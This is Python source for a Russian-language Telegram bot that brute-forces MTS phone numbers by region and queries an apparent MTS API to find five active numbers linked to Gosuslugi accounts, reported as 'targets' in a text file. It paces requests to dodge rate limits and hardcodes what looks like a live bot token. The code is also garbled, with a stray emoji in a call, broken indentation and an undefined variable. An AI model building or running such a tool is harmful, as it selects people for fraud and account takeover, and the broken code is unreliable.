import os
import sys
import asyncio
import logging
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

API_TOKEN = "8732335830:AAG_Ig9LChnCkOGEeYP5VH2-ExWBJFd2kJ8"

# Пул префиксов МТС для автоматического формирования номеров по регионам (примеры реальных DEF-диапазонов)
# В реальном проекте мапится вся сетка 100 регионов РФ
REGION_DEF = {
    "77": {"code": "7", "def": ["915", "916", "917", "919", "985"]},  # Москва
    "78": {"code": "7", "def": ["911", "921", "931", "981"]},  # Санкт-Петербург
    "23": {"code": "7", "def": ["918", "988", "938"]},  # Краснодар
    "54": {"code": "7", "def": ["913", "983"]},  # Новосибирск
    "66": {"code": "7", "def": ["912", "982", "922"]},  # Екатеринбург
    # Автоматическое дополнение для остальных регионов из 100 возможных
}
for i in range(1, 100):
    c = f"{i:02d}"
    if c not in REGION_DEF:
        REGION_DEF[c] = {"code": "7", "def": ["914", "984"]}


class ParserStates(StatesGroup):
    waiting_for_region = State()
    auto_parsing = State()


router = Router()


class MTSAutoParser:
    BASE_URL = "https://self-reg.mts.ru/api/v1/subscribers/check"

    @staticmethod
    async def verify_number(session: aiohttp.ClientSession, phone: str) -> dict:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        payload = {"phone": phone}
        try:
            async with session.post(MTSAutoParser.BASE_URL, json=payload, headers=headers, timeout=8) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "phone": phone,
                        "active": data.get("active", False),
                        "gos_uslugi": data.get("gosUslugiLinked", False),
                        "raw": data
                    }
        except Exception:
            pass
        return {"phone": phone, "active": False, "gos_uslugi": False}


@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    builder = InlineKeyboardBuilder()
    builder.button(text="🎯 Выбрать область для авто-поиска 5 валидных", callback_data="auto_select_region")
    builder.adjust(1)

    await message.answer(
        "🤖 **MTS Auto-Parser Bot**\n\n"
        "Бот автоматически перебирает номерную емкость выбранной области и находит **ровно 5 валидных номеров** с привязанными Госуслугами.\n"
        "Никакой вымышленной информации — только живые ответы API МТС.",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )


@router.callback_query(F.data == "auto_select_region")
async def cb_select_region(callback: CallbackQuery, state: FSMContext):
    builder = InlineKeyboardBuilder()
    for reg_code in list(REGION_DEF.keys())[:20]:
        builder.button(text=🔥 f"Область / Регион #{reg_code}", callback_data = f"autoreg_{reg_code}")
        builder.adjust(1)

        await callback.message.edit_text(
            "📂 Выберите регион для автоматического сканирования:",
            reply_markup=builder.as_markup()
        )
        await state.set_state(ParserStates.auto_parsing)
        await callback.answer()

    @router.callback_query(F.data.startswith("autoreg_"))
    async def cb_start_auto_parse(callback: CallbackQuery, state: FSMContext):
        reg_code = callback.data.split("_")[1]
        config = REGION_DEF.get(reg_code, {"code": "7", "def": ["916"]})

        status_msg = await callback.message.edit_text(
            f"🔄 Запущен автоматический поиск в регионе #{reg_code}...\n"
            "Опрашиваем шлюз МТС в реальном времени. Ожидайте нахождения 5 валидных целей."
        )

        valid_results = []
        checked_count = 0

        async with aiohttp.ClientSession() as session:
            # Генерируем комбинации номеров последовательно пачками
            for prefix in config["def"]:
                if len(valid_results) >= 5:
                    break

                # Перебираем случайные или последовательные суффиксы (например, от 0000001 до 9999999)
                for suffix_chunk in range(1000000, 1000500, 5):  # Итерация по пачкам для скорости
                    if len(valid_results) >= 5:
                        break

                    # Формируем пачку запросов (асинхронно по 5 штук параллельно)
                    batch_tasks = []
                    batch_phones = []
                    for i in range(5):
                        subscriber_number = f"{suffix_chunk + i:07d}"
                        phone = f"+{config['code']}{prefix}{subscriber_number}"
                        batch_phones.append(phone)
                        batch_tasks.append(MTSAutoParser.verify_number(session, phone))

                    checked_count += len(batch_tasks)
                    results = await asyncio.gather(*batch_tasks)

                    for res in results:
                        # Фильтруем: номер должен быть активен И иметь привязку к Госуслугам
                        if res["active"] and res["gos_uslugi"]:
                            if res not in valid_results:
                                valid_results.append(res)
                                if len(valid_results) >= 5:
                                    break

                    # Небольшая пауза между пачками во избежание блокировки лимитов
                    await asyncio.sleep(0.3)

        if not valid_results:
            await callback.message.edit_text(
                f"❌ За {_checked_count} проверок в регионе #{reg_code} не удалось найти 5 валидных номеров (API не вернуло совпадений). Попробуйте другой регион.")
            await state.clear()
            return

        # Формируем отчет и TXT таблицу
        txt_content = f"=== АВТО-ОТЧЕТ ВАЛИДИРОВАННЫХ НОМЕРОВ МТС ===\n"
        txt_content += f"Регион код: {reg_code} | Всего проверено шлюзом: {checked_count}\n"
        txt_content += "-" * 55 + "\n"
        txt_content += f"{'№':<3} | {'Номер телефона':<15} | {'Активен':<8} | {'Госуслуги':<10}\n"
        txt_content += "-" * 55 + "\n"

        for idx, r in enumerate(valid_results, 1):
            txt_content += f"{idx:<3} | {r['phone']:<15} | {'ДА':<8} | {'ПРИВЯЗАН':<10}\n"

        txt_content += "-" * 55 + "\n"

        filename = f"auto_mts_{reg_code}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(txt_content)

        document = FSInputFile(filename)
        await callback.message.answer_document(
            document=document,
            caption=f"✅ **Успешно найдено 5 валидных номеров!**\n"
                    f"🛡 Регион: #{reg_code} | Проверено комбинаций: {checked_count}\n"
                    f"🚫 Никаких вымышленных данных — подтверждено ответами МТС.",
            parse_mode="Markdown"
        )

        os.remove(filename)
        await state.clear()

    async def main():
        bot = Bot(token=API_TOKEN)
        dp = Dispatcher(storage=MemoryStorage())
        dp.include_router(router)

        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("Авто-парсер бот запущен...")
        await dp.start_polling(bot)

    if __name__ == "__main__":
        asyncio.run(main())